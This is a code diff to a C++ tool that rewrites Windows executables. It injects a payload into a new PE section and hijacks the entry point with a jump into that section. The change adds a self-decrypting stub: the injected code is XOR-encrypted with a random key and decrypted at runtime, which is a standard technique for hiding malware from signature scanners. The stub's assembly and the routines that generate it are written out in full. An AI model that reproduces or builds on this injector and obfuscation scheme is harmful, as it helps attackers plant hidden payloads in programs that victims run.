@@ -40,41 +40,41 @@ Morph_Executable_Controller::Morph_Executable_Controller()
     this->num_of_stosd = 0;
     this->buffer_cursor = 0;
     this->start_of_payload_section_offset = 0;
+    this->random_key = 0;
+    this->length_to_decrypt = 0;
 
 }
 
 //destructor
 Morph_Executable_Controller::~Morph_Executable_Controller()
 {
-    std::cout << "START OF DESTRUCTOR" << std::endl;
 
-    std::cout << "1\n";
     this->dos_header_pointer = nullptr;
     delete this->dos_header_pointer;
-    std::cout << "2\n";
+
     this->image_NT_header_ptr = nullptr;
     delete this->image_NT_header_ptr;
-    std::cout << "3\n";
+
     this->text_section_header_ptr = nullptr;
     delete this->text_section_header_ptr;
-    std::cout << "4\n";
+
     this->payload_section_header_ptr = nullptr;
     delete this->payload_section_header_ptr;
-    std::cout << "5\n";
+
     delete[] this->text_section_buffer_ptr;
-    std::cout << "6\n";
+
     delete[] this->text_section_buffer_original;
-    std::cout << "7\n";
+
     for(int i = 0; i < this->image_section_header_vec.size(); i++)
     {
         delete this->image_section_header_vec[i];
-        std:: cout << "7.5 ";
+
     }
-     std::cout << "\n8\n";
+
     this->image_section_header_vec.clear();
-     std::cout << "your mom" << std::endl;
-     this->cur_wind = nullptr;
-     delete this->cur_wind;
+
+    this->cur_wind = nullptr;
+    delete this->cur_wind;
 
 }
 
@@ -387,7 +387,8 @@ void Morph_Executable_Controller::get_stosd_instruction_asm(std::string &patchin
 
 }
 
-void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char *machine_code, unsigned int size_of_machine_code)
+void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char *machine_code,
+	unsigned int size_of_machine_code)
 {
     for (int i = 0; i < size_of_machine_code; i++)
     {
@@ -469,6 +470,117 @@ void Morph_Executable_Controller::write_exe_file(QString morphed_exe_file_path, 
 void Morph_Executable_Controller::store_edi(std::string &store_payload_entry_point_in_edi_asm, DWORD entry_point_of_text_section)
 {
     store_payload_entry_point_in_edi_asm = "mov edi, " + convert_num_to_hex<DWORD>(entry_point_of_text_section) + ";";
+}
+
+char Morph_Executable_Controller::generate_random_key()
+{
+    srand(time(NULL));
+    //key must be 0 to 255, max range is FF in hexadecimal
+    return rand() % 256;
+}
+
+void Morph_Executable_Controller::add_bytes_into_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
+                                                     std::vector<unsigned char> machine_code_vec)
+{
+    for(int i = 0; i < machine_code_vec.size(); i++)
+    {
+        bytes_after_decryption_instructions_vec.emplace_back(machine_code_vec[i]);
+    }
+}
+
+void Morph_Executable_Controller::encrypt_bytes_after_decryption_instruction_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
+                                                                                 char random_key)
+{
+    for(int i = 0; i < bytes_after_decryption_instructions_vec.size(); i++)
+    {
+        bytes_after_decryption_instructions_vec[i] = bytes_after_decryption_instructions_vec[i] ^ random_key;
+    }
+}
+
+void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
+                                                     DWORD start_of_payload_section_offset,
+                                                     unsigned int length_of_random_key,
+                                                     std::vector<unsigned char> &machine_code_vec,
+                                                     size_t &machine_code_num_of_bytes,
+                                                     unsigned int size_of_bytes_after_decryption_instructions_vec)
+{
+    std::string decrypt_first_half_temp = "mov ecx, dword ptr[" +
+            convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];"; // this is to obtain the random key
+
+    decrypt_first_half_temp += "xor ebx, ebx;";
+    //this line will contain arbitrary address, will just be used to calculate the length of the
+    //whole decryption function, note that this instructions will not actually be injected
+    decrypt_first_half_temp += "mov eax, " + convert_num_to_hex<DWORD>(start_of_payload_section_offset)+ ";";
+    machine_code_vec.clear();
+
+    //once again this is arbitrary, we just need the length of the first half of the
+    //decryption function, note that this instructions will not actually be injected
+    asm_to_machine_code(decrypt_first_half_temp,machine_code_vec,machine_code_num_of_bytes);
+
+    unsigned int length_of_first_half = machine_code_num_of_bytes;
+
+    std::string decrypt_second_half = "xor byte ptr [eax], cl;" ; // start decrypting from address of encrypted bytes, stored in eax
+    decrypt_second_half += "inc ebx;"; // increase ebx, this acts as a counter
+    decrypt_second_half += "inc eax;"; // increase eax, this adds the address + 1, this is to traverse the encrypted bytes
+    decrypt_second_half += "cmp ebx, " +
+            convert_byte_to_string(size_of_bytes_after_decryption_instructions_vec) +
+            ";"; // this is the length of the total encrypted bytes, compares the counter with this, if it reaches, will stop "looping"
+
+    machine_code_vec.clear();
+
+    asm_to_machine_code(decrypt_second_half,machine_code_vec,machine_code_num_of_bytes);
+
+    //getting the length of the second half, this does not include the jne instruction yet
+    unsigned int length_of_second_half = machine_code_num_of_bytes;
+
+    //this is the total length of the decryption function
+    unsigned int length_of_decryption_function = length_of_first_half + length_of_second_half;
+
+    //TODO, the JNE, for now the jne length is hard coded
+
+
+    decrypt_asm = "mov ecx, dword ptr[" +
+            convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];";//this is to obtain the random key, which is at the first offset
+    decrypt_asm += "xor ebx, ebx;"; // ebx acts as a counter
+    decrypt_asm += "mov eax, " + convert_num_to_hex<DWORD>(start_of_payload_section_offset +
+                                                           length_of_decryption_function +
+                                                           length_of_random_key +
+                                                           (sizeof(BYTE) * 2)) + ";";//jne opcode + backwards jump opcode
+                                                                                     //each is 1 byte, hence total is 2 bytes
+	decrypt_asm += decrypt_second_half;
+	
+	machine_code_vec.clear();
+
+    asm_to_machine_code(decrypt_asm,machine_code_vec,machine_code_num_of_bytes);
+
+    calculate_jne_short_backwards(machine_code_vec,length_of_second_half, machine_code_num_of_bytes);
+}
+
+void Morph_Executable_Controller::calculate_jne_short_backwards(std::vector<unsigned char> &machine_code_vec,unsigned int length_of_jne,
+																size_t &machine_code_num_of_bytes)
+{
+    //most efficient offsets are in this range, -128 to 127, in twos complement, binary
+    //must be signed
+    if(length_of_jne <= 128 && length_of_jne > 0)
+    {
+        machine_code_vec.emplace_back('\x75');
+        //because the jne must start from the last 2 bytes
+        //opcode of the JNE and the byte to jump to is 2 bytes
+        length_of_jne += 2;
+
+        // 2s complement
+        length_of_jne = length_of_jne ^ 0xFF;
+        length_of_jne += 1;
+		std::string bytes = convert_byte_to_string(length_of_jne);
+		machine_code_vec.emplace_back((BYTE)length_of_jne);
+		machine_code_num_of_bytes += 2; // this is because we emplaced back 2 opcodes
+    }
+}
+
+void Morph_Executable_Controller::add_random_key_to_payload_section_buffer_ptr(char *&payload_section_buffer_ptr, char random_key)
+{
+    *payload_section_buffer_ptr = random_key;
+    payload_section_buffer_ptr++;
 }
 
 void Morph_Executable_Controller::error_warning_message_box(QString status)
@@ -982,12 +1094,19 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     //getting image base via image_NT_header_ptr optional header
     this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;
 
+    //generating a random key for encryption scheme
+    this->random_key = generate_random_key();
+
+    unsigned int length_of_random_key = sizeof(random_key);
+
+
     //getting the start of the payload section, which is image base + payload virtual size
     this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;
 
-    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
+    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string.
+    //since random key is stored in the first byte, the offset needs to + the length of the random key
     std::string jump_to_payload_asm = "mov ecx, ";
-    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset) + ";";
+    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset + length_of_random_key) + ";";
     jump_to_payload_asm += "jmp ecx;";
     this->machine_code_vec.clear(); //clear vector to input new machine code
 
@@ -1020,6 +1139,11 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     char *payload_section_buffer_original = new char [this->payload_raw_data_size];
     char *payload_section_buffer_ptr = payload_section_buffer_original;
 
+
+    //to store the bytes after the decryption instruction bytes
+    //so we can populate the rest in one pass
+    std::vector<unsigned char> bytes_after_decryption_instructions_vec;
+
     //we need to store the payload entry point address into edi, so that stosd will work as intended
     //safe practice, incase edi was used or modified previously
     std::string store_payload_entry_point_in_edi_asm = "";
@@ -1028,10 +1152,8 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     asm_to_machine_code(store_payload_entry_point_in_edi_asm,
                         this->machine_code_vec,this->machine_code_num_of_bytes);
 
-    populate_section_ptr(payload_section_buffer_ptr,
-                                reinterpret_cast<char*>(this->machine_code_vec.data()),
-                                this->machine_code_num_of_bytes);
-
+    //adding the mov edi instructions into the vector
+    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);
 
     //here we memorize the original bytes of the text section
     //this will be used in the payload section to patch back the overwritten text section bytes
@@ -1059,17 +1181,13 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
                         this->machine_code_num_of_bytes);
 
+    //adding the patching_entry_bytes_asm instructions into the vector
+    //currently has mov edi instructions + this patching_entry_bytes_asm
+    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);
 
-    //writing the machine code into payload_section_buffer_ptr
-    //this will be used later to write back to the buffer
-    populate_section_ptr(payload_section_buffer_ptr,
-                                reinterpret_cast<char*>(this->machine_code_vec.data()),
-                                this->machine_code_num_of_bytes);
-
-    //putting in the payload into payload_section_buffer_ptr
-    populate_section_ptr(payload_section_buffer_ptr,
-                         reinterpret_cast<char*>(this->payload_vec.data()),
-                         this->payload_num_of_bytes);
+    //adding the payload instructions into the vector
+    //currently has mov edi instructions + patching_entry_bytes_asm + this payload instructions
+    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->payload_vec);
 
     //getting the asm instructions to jump back to the text section
     std::string jump_back_to_text_section_asm = "";
@@ -1081,14 +1199,43 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
                         this->machine_code_num_of_bytes);
 
-    //putting in the jump back to text section into payload_section_buffer_ptr
+    //adding the jump back to text section instructions into the vector
+    //currently has mov edi instructions + patching_entry_bytes_asm + payload instructions
+    // + this jump back to text section instructions
+    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);
+
+    //encrypting contents of the vector, by xor with the random key
+    encrypt_bytes_after_decryption_instruction_vec(bytes_after_decryption_instructions_vec,this->random_key);
+
+
+    // ================== START HERE FOR DECRYPTION SCHEME ================================
+    std::string decrypt_asm = "";
+    get_decryption_asm(decrypt_asm,
+                       this->start_of_payload_section_offset,
+                       length_of_random_key,
+                       this->machine_code_vec,
+                       this->machine_code_num_of_bytes,
+                       bytes_after_decryption_instructions_vec.size());
+
+    //putting a random key into the beginning of the payload section
+    add_random_key_to_payload_section_buffer_ptr(payload_section_buffer_ptr, this->random_key);
+
+
+    //adding in the decryption routine into payload_section_buffer_ptr
+    //(this->machine_code_vec.data()) contains the decryption routine
     populate_section_ptr(payload_section_buffer_ptr,
                          reinterpret_cast<char*>(this->machine_code_vec.data()),
                          this->machine_code_num_of_bytes);
 
 
+    //putting in the jump back to text section into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(bytes_after_decryption_instructions_vec.data()),
+                         bytes_after_decryption_instructions_vec.size());
+
 
     //===================================================================================
+
     rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
                             this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
     //replacing back the edited image_NT_header_ptr into the buffer
@@ -1133,7 +1280,7 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
                             this->buffer_cursor,this->size_of_text_section);
 
 
-     print_section_headers(image_section_header_vec);
+    // print_section_headers(image_section_header_vec);
     //writing to file
     write_exe_file(this->morphed_exe_file_path, this->buffer);
     //free memory
